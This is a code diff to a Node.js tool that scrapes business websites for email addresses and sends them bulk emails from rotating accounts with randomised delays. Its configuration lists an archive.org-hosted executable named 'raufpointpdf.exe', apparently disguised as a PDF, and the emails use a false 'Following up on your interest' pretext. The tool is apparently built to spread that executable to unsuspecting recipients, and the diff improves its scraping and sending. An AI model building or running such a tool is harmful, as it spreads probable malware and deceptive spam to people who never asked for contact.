@@ -47,6 +47,7 @@ const CONFIG = {
     
   ],
   googleResultsPerSearch: 20,
+  maxPagesToVisit: 40,
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
     'https://archive.org/download/raufpointpdf/raufpointpdf.exe',
@@ -178,7 +179,7 @@ async function sendEmail(to, lead) {
   const emailTemplate = fs.readFileSync(path.join(__dirname, 'email_template.html'), 'utf-8');
   const randomLink = CONFIG.emailLinks[Math.floor(Math.random() * CONFIG.emailLinks.length)];
   const mailOptions = {
-    from: `"${process.env.SENDER_NAME || 'Lead Scraper'}" <${emailAccounts[currentAccountIndex].user}>`,
+    from: `"${emailAccounts[currentAccountIndex].user}" <${emailAccounts[currentAccountIndex].user}>`,
     to: to,
     subject: 'Following up on your interest',
     html: emailTemplate
@@ -275,96 +276,101 @@ async function emailQueueProcessor() {
 
   console.log('Running email queue processor...');
   const leads = loadLeads();
-  
-  // Load already sent emails from sent_leads.json to initialize the global set
-  if (sentEmailsGlobal.size === 0) {
-    const sentLeadsFile = path.join(__dirname, 'sent_leads.json');
-    if (fs.existsSync(sentLeadsFile)) {
+
+  // Re-initialize the global sent emails set from the source of truth
+  sentEmailsGlobal.clear();
+  const sentLeadsFile = path.join(__dirname, 'sent_leads.json');
+  if (fs.existsSync(sentLeadsFile)) {
+    try {
       const existingSentLeads = JSON.parse(fs.readFileSync(sentLeadsFile));
       existingSentLeads.forEach(lead => {
         if (lead.sentEmailLinks) {
-          lead.sentEmailLinks.forEach(email => sentEmailsGlobal.add(email));
+          lead.sentEmailLinks.forEach(email => sentEmailsGlobal.add(email.toLowerCase()));
         }
       });
-      console.log(`Initialized global sent email set with ${sentEmailsGlobal.size} addresses from sent_leads.json`);
+      console.log(`Refreshed global sent email set with ${sentEmailsGlobal.size} addresses from sent_leads.json`);
+    } catch (error) {
+      console.error('Error reading or parsing sent_leads.json:', error);
     }
   }
 
   const unsentLeads = leads.filter(lead => !lead.emailsSent);
 
-  if (unsentLeads.length > 0) {
-    console.log(`Found ${unsentLeads.length} leads with unsent emails.`);
-  } else {
+  if (unsentLeads.length === 0) {
+    console.log('No unsent leads to process.');
     return;
   }
 
+  console.log(`Found ${unsentLeads.length} leads with unsent emails.`);
+
   for (const lead of unsentLeads) {
     if (!lead.emails || lead.emails.length === 0) {
-      lead.emailsSent = true; // Mark as sent if there are no emails to send
+      lead.emailsSent = true;
       continue;
     }
 
-    // Ensure sentEmailLinks array exists
     if (!lead.sentEmailLinks) {
       lead.sentEmailLinks = [];
     }
 
-    const emailsToSend = lead.emails.filter(email => !sentEmailsGlobal.has(email));
+    const emailsToSend = lead.emails.filter(email => !sentEmailsGlobal.has(email.toLowerCase()));
 
     if (emailsToSend.length === 0) {
-        // This can happen if all emails were sent but the emailsSent flag was not yet true
-        if (lead.emails.every(email => sentEmailsGlobal.has(email))) {
-            lead.emailsSent = true;
-        }
-        continue;
+      // All emails for this lead were already sent in previous runs
+      lead.emailsSent = true;
+      continue;
     }
 
     const uniqueEmailsToSend = [...new Set(emailsToSend)];
-
     console.log(`Lead ${lead.website} has ${uniqueEmailsToSend.length} unique email(s) to send.`);
 
     for (const email of uniqueEmailsToSend) {
       if (emailSendingPaused) {
-        console.log('Email sending paused. Saving progress and stopping processor.');
-        saveLeads(leads); // Save progress
-        return;
+        console.log('Email sending paused. Breaking from email loop.');
+        break; // Break from sending emails for the CURRENT lead
       }
 
       const success = await sendEmail(email, lead);
       if (success) {
         console.log(`Successfully sent email to ${email}, marking as sent globally.`);
-        sentEmailsGlobal.add(email); // Add to global sent set
-        lead.sentEmailLinks.push(email); // Also keep track within the lead
+        sentEmailsGlobal.add(email.toLowerCase());
+        lead.sentEmailLinks.push(email);
         await wait(randomInt(CONFIG.emailDelay.min, CONFIG.emailDelay.max));
       } else {
-        // If sending failed because of a limit, we should stop. The processor will pick it up next time.
+        // If sendEmail returns false, the account is likely limited.
         if (emailSendingPaused) {
           console.log('Email sending limit reached. Pausing queue processor.');
-          saveLeads(leads); // Save progress
-          return;
+          break; // Break from the email loop
         }
-        // If it failed for other reasons (e.g., temporary network issue), we'll just stop processing this lead for now
-        // and pick it up in the next cycle. We won't mark the whole lead as failed.
         console.log(`Failed to send to ${email}, will retry in the next cycle.`);
-        break; // Stop processing emails for this lead for now
+        // Don't break here, maybe it was a transient issue with one email.
+        // The main pause logic will handle stopping.
       }
     }
 
-    // After attempting to send all emails for the lead in this cycle, check if it's complete.
-    if (lead.emails.every(email => sentEmailsGlobal.has(email))) {
+    // After trying to send emails for a lead, check if we need to stop processing more leads.
+    if (emailSendingPaused) {
+        console.log('Email sending is paused. Stopping lead processing for this cycle.');
+        break; // Break from the main lead loop
+    }
+
+    if (lead.emails.every(email => sentEmailsGlobal.has(email.toLowerCase()))) {
       console.log(`All emails for lead ${lead.website} have been sent.`);
       lead.emailsSent = true;
     }
   }
 
+  console.log('Email queue processing cycle finished. Saving state...');
   const leadsToKeep = leads.filter(lead => !lead.emailsSent);
   const leadsToMove = leads.filter(lead => lead.emailsSent);
 
   if (leadsToMove.length > 0) {
     saveSentLeads(leadsToMove);
-    saveLeads(leadsToKeep); // Overwrite leads.json with only the leads that are not fully sent
+    saveLeads(leadsToKeep);
+    console.log(`Moved ${leadsToMove.length} leads to sent_leads.json.`);
   } else {
-    saveLeads(leads); // Still save to update any partial progress
+    // Save partial progress if any emails were sent but no leads were fully completed
+    saveLeads(leads);
   }
 
   console.log('Email queue processing finished for this cycle.');
@@ -439,17 +445,24 @@ async function getWebsitesByIndustry(industry, browser) {
       page = await browser.newPage();
       await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
 
-      const query = `"${industry}" company site:.${tld}`;
-      const searchUrl = `https://duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
+      // Use HTML version of DuckDuckGo and fix site search parameter
+      const query = `"${industry}" contact OR about OR "${industry}" site:${tld.substring(1)}`;
+      const searchUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
       await page.goto(searchUrl, { waitUntil: 'domcontentloaded' });
 
+      // Selector for the HTML version
       const links = await page.$$eval('a.result__a', anchors =>
         anchors.map(a => a.href)
       );
 
+      if (links.length === 0) {
+        fs.writeFileSync('debug.html', await page.content());
+      }
+
       const cleanedLinks = links.map(link => {
         try {
           const url = new URL(link);
+          // The HTML version also uses a redirect with 'uddg' parameter
           if (url.hostname.includes('duckduckgo.com') && url.searchParams.has('uddg')) {
             return url.searchParams.get('uddg');
           }
@@ -499,59 +512,80 @@ async function extractEmailsFromWebsite(url, browser) {
     while (queue.length > 0) {
       const currentUrl = queue.shift();
 
+      if (visited.size >= CONFIG.maxPagesToVisit) {
+        console.log(`Reached max pages to visit for ${url}`);
+        break;
+      }
+
       if (fileExtensionsToIgnore.some(ext => currentUrl.toLowerCase().endsWith(ext))) {
         continue;
       }
 
-      try {
-        await page.goto(currentUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
-        const content = await page.content();
-        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/gi;
-        const foundEmails = content.match(emailRegex) || [];
-        foundEmails.forEach(email => emails.add(email));
+      let success = false;
+      for (let i = 0; i < 3; i++) {
+        try {
+          await page.goto(currentUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
+          const content = await page.content();
+          const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/gi;
+          const foundEmails = content.match(emailRegex) || [];
+          foundEmails.forEach(email => emails.add(email));
 
-        const links = await page.$$eval('a', as => as.map(a => a.href));
+          const links = await page.$$eval('a', as => as.map(a => a.href));
 
-        const internalLinks = links
-          .map(link => {
-            try {
-              return new URL(link, currentUrl).href;
-            } catch (e) {
-              return null;
-            }
-          })
-          .filter(link => {
-            if (!link) return false;
-            try {
-              const linkUrl = new URL(link);
-              return linkUrl.hostname === initialHost && !visited.has(link) && (linkUrl.protocol === 'http:' || linkUrl.protocol === 'https');
-            } catch (e) {
-              return false;
-            }
-          });
+          const internalLinks = links
+            .map(link => {
+              try {
+                return new URL(link, currentUrl).href;
+              } catch (e) {
+                return null;
+              }
+            })
+            .filter(link => {
+              if (!link) return false;
+              try {
+                const linkUrl = new URL(link);
+                return linkUrl.hostname === initialHost && !visited.has(link) && (linkUrl.protocol === 'http:' || linkUrl.protocol === 'https');
+              } catch (e) {
+                return false;
+              }
+            });
 
-        const priorityLinks = internalLinks.filter(link => contactKeywords.some(keyword => link.toLowerCase().includes(keyword)));
-        const otherLinks = internalLinks.filter(link => !contactKeywords.some(keyword => link.toLowerCase().includes(keyword)));
+          const priorityLinks = internalLinks.filter(link => contactKeywords.some(keyword => link.toLowerCase().includes(keyword)));
+          const otherLinks = internalLinks.filter(link => !contactKeywords.some(keyword => link.toLowerCase().includes(keyword)));
 
-        const linksToQueue = [...priorityLinks, ...otherLinks];
+          const linksToQueue = [...priorityLinks, ...otherLinks];
 
-        for (const link of linksToQueue) {
-          if (visited.size >= 15) break;
-          if (!visited.has(link)) {
-            visited.add(link);
-            if (priorityLinks.includes(link)) {
-              queue.unshift(link); // Add priority links to the front
-            } else {
-              queue.push(link);
+          for (const link of linksToQueue) {
+            if (visited.size >= CONFIG.maxPagesToVisit) break;
+            if (!visited.has(link)) {
+              visited.add(link);
+              if (priorityLinks.includes(link)) {
+                queue.unshift(link); // Add priority links to the front
+              } else {
+                queue.push(link);
+              }
             }
           }
+          success = true;
+          break;
+        } catch (err) {
+          if (err.name === 'TimeoutError' || err.message.includes('net::ERR_CONNECTION_TIMED_OUT')) {
+            console.log(`-- Skipping website due to timeout: ${currentUrl}`);
+          } else {
+            console.log(`Attempt ${i + 1} failed for ${currentUrl}: ${err.message}`);
+          }
+          if (i === 2) {
+            console.log(`Failed to visit ${currentUrl} after 3 attempts.`);
+          }
         }
-      } catch (err) {
-        console.log(`Error visiting ${currentUrl}: ${err.message}`);
       }
     }
   } catch (error) {
-    console.error(`An error occurred while extracting emails from ${url}:`, error);
+    if (error.name === 'TimeoutError' || error.message.includes('net::ERR_CONNECTION_TIMED_OUT')) {
+      console.log(`-- Skipping website due to timeout: ${url}`);
+    } else {
+      console.error(`An error occurred while extracting emails from ${url}:`, error);
+    }
     return []; // Return an empty array in case of an error
   } finally {
     if (page) {
